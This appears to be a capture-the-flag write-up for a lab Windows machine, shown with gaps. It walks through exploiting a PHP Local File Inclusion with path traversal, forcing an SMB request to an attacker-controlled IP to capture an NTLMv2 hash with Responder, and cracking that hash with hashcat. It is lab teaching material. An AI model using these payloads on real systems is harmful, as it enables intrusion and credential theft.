...
## Visited Site
Reached the IP address on browser but said 
"We can’t connect to the server at unika.htb."
...
After that is done, it brings up a webpage.

We can find in the webpage there is an option that shows content in different languages. The URL shows:
http://unika.htb/index.php?page=french.html

This here suggests a Local File Inclusion vulnerability based on 3 things:
1. It's a dynamic site.
2. The query parameter is named page, which is likely that it's accessing the server's local file.
3. Unsafe code that allows LFI is more likely with php code.

Thus, we'll start putting in the value for the 'page' query parameter with path traversal value. The most common file to look for inside a Windows system is the hosts file. The value would be `'/windows/system32/drivers/etc/hosts'`. We'll keep prepending path traversal '../' until we get the file.
...
We will start the attack using a tool called **Responder** on our machine that will listen on port 445. We will have the server make a SMB request to the Responder by using SSRF on the website URL's query parameter `'?page='`:
```
http://unika.htb/index.php?page=//10.10.15.24/share
```

This gives us the challenge response from the victim:
```
...
We'll save this in a text file "response.txt" and crack it offline using Hashcat which has NTLMv2 response cracking built in.
```
hashcat -m 5600 response.txt /usr/share/wordlists/rockyou.txt
```

Here, we got it cracked:
```
...
We can connect using WinRM since it's port is open at port 5985 which we know from the nmap scan. But since Linux doesn't have PowerShell, we'll use Evil-WinRM built just for this situation:
```bash
